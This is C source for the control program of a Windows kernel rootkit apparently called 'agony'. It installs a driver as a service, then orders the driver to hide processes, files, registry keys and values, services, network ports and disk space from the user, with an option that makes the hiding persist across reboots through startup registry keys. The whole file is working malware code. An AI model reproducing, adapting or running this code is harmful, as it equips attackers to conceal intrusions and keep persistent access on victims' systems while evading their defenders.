int main(int argc,char **argv)
{
  HANDLE SCManager = 0; 
  HANDLE service = 0;
  HANDLE device = 0;
  SERVICE_STATUS status;
  int i=1,j;
  char sysfilepath[256];
  char devicepath[256];
  char ret[1024];
  WCHAR ToSend[512];
  DWORD code, bytes;
  char DriveLetter;
  unsigned short port;
  unsigned long space;
  
  if( argc<2 ) {
     usage(argv[0]);
     return 0;
  }
  
  // get sysfile path
  GetCurrentDirectory(sizeof(sysfilepath), sysfilepath);
  strcat( sysfilepath, "\\\\" );
  strcat( sysfilepath, SYSFILE );
  
  if( !FileExists( sysfilepath ) && strcmp(argv[1],"-stop")  && strcmp(argv[1],"-h") ) {
      printf("extracting .sys...\n");
      if( !ExtractSysFile() ) {
        printf("cannot extract sys file...\n");
        return 0;
      }  
  }

  // MultiByteToWideChar(CP_ACP, 0, argv[4], -1, ToSend, sizeof(ToSend));
  
  SCManager = OpenSCManager(NULL,NULL,SC_MANAGER_CREATE_SERVICE);
  if(SCManager) {
     service = CreateService(SCManager, SERVICENAME, SERVICENAME, SERVICE_ALL_ACCESS,
             SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,SERVICE_ERROR_NORMAL,
             sysfilepath, NULL,NULL,NULL,NULL,NULL);

     if(!service) // if we cannot create it, maybe he is already existing 
        service = OpenService(SCManager,SERVICENAME, SERVICE_ALL_ACCESS);
     
     if(service)    
        StartService(service, 0, NULL);
     else
        printf("cannot create/open the service\n");   
  }   
  else 
     printf("cannot open the service manager\n");  
   
  sprintf(devicepath,"\\\\.\\Global\\%s\0",DEVICE); 
  device = CreateFile(devicepath,GENERIC_READ|GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);
  
  if( !device || device==INVALID_HANDLE_VALUE ) {   
     printf("cannot communicate with the driver.\n");
     CloseServiceHandle(service);
     CloseServiceHandle(SCManager);
     return 0; 
  }
   
  if( !strcmp(argv[1], "-stop")) {
     // stop & uninstall service
     
     // clean startup reg keys
     fix( NULL, FALSE );
     
     // delete VOLUME.INI files
     DeleteAllSpaceFiles();
     
     if( device ) 
        CloseHandle( device );

     if( service ) {   
        ControlService(service, SERVICE_CONTROL_STOP,&status);
        DeleteService(service);
        CloseServiceHandle(service);
     }
     
     if( SCManager )
        CloseServiceHandle(SCManager);
     return 0;
  }  
  
  if( !strcmp(argv[1], "-h")) {
     printf("all options \"cumulables\" in a same command line\n");
     printf("for exemple: agony -p process1.exe process2.exe will hide 2 process\n");
     printf("we can accumulate different options on a same line:\n");
     printf("%s -p process.exe process2.exe -s service1 -f process1.exe process2.exe\n",argv[0]);
     printf("we can also choose to launch our command one by one\n\n");
     printf("for the -space option, the syntax is:\n");
     printf("%s -space volume_letter:space_to_hide_in_MB\n",argv[0]);
     printf("we can cumulate for option -space, like other options:\n");
     printf("%s -space C:5000 D:1000 F:5500\n",argv[0]);
     return 0;   
  }   
    
  code = NO_MSG;  
    
  while( i < argc ) { 
     if( !strcmp(argv[i],"-p") ) {
        code = PROCESS_CODE;  
        i++; continue;
     }
     if( !strcmp(argv[i],"-f") ) { 
        code = FILE_CODE;    
        i++; continue;
     }   
     if( !strcmp( argv[i], "-k" ) ) {
        code = REGKEY_CODE;        
        i++; continue;
     }       
     if( !strcmp( argv[i], "-v" ) ) {
        code = REGVALUE_CODE;  
        i++; continue;
     } 
     if( !strcmp( argv[i], "-s" ) ) {
        code = SERVICE_CODE;  
        i++; continue;
     }  
     if( !strcmp( argv[i], "-tcp" ) ) {
        code = TCP_PORT_CODE;  
        i++; continue;
     }   
     if( !strcmp( argv[i], "-udp" ) ) {
        code = UDP_PORT_CODE;  
        i++; continue;
     }  
     if( !strcmp( argv[i], "-space" ) ) {
        code = DISK_SPACE_CODE;  
        i++; continue;
     }  
     if( !strcmp( argv[i], "-r" ) ) {
        // we get the initial cmdline
        ret[0] = '\0'; 
        for(j=1; j<argc; j++) {
           strcat(ret, " ");       
           strcat(ret, argv[j]);           
        }          
        fix(ret, TRUE); 
        i++; continue;
     } 
     
     
     if( code == DISK_SPACE_CODE ) {
        DriveLetter = argv[i][0];
        space = atoi( argv[i]+2 );
        if(!CreateSpaceFile(DriveLetter,space))
           printf("volume %c space will not be falsificated\n", DriveLetter);   
        // we launch the hook and we hide the VOLUME.INI file
        DeviceIoControl(device, CODEMSG(DISK_SPACE_CODE), LSPACEFILENAME, sizeof(LSPACEFILENAME), 
                                       &ret, sizeof(ret),&bytes,NULL); 
        DeviceIoControl(device, CODEMSG(FILE_CODE), LSPACEFILENAME, sizeof(LSPACEFILENAME), 
                                       &ret, sizeof(ret),&bytes,NULL);  
     }
     else if( code == TCP_PORT_CODE || code == UDP_PORT_CODE ) {
        port = atoi( argv[i] );
        DeviceIoControl(device, CODEMSG(code), &port, sizeof(port), 
                                       &ret, sizeof(ret),&bytes,NULL);
     }  
     else {
        // convert the arg to wide char before sending
        MultiByteToWideChar(CP_ACP, 0, argv[i], -1, ToSend, sizeof(ToSend));
        DeviceIoControl(device, CODEMSG(code), ToSend, (wcslen(ToSend)+1)*2, 
                                       &ret, sizeof(ret),&bytes,NULL);
     }                                  
     i++;
  }
  
  CloseHandle( device );
  if( service )
     CloseServiceHandle(service);
  if( SCManager )
     CloseServiceHandle(SCManager);
  return 0;
}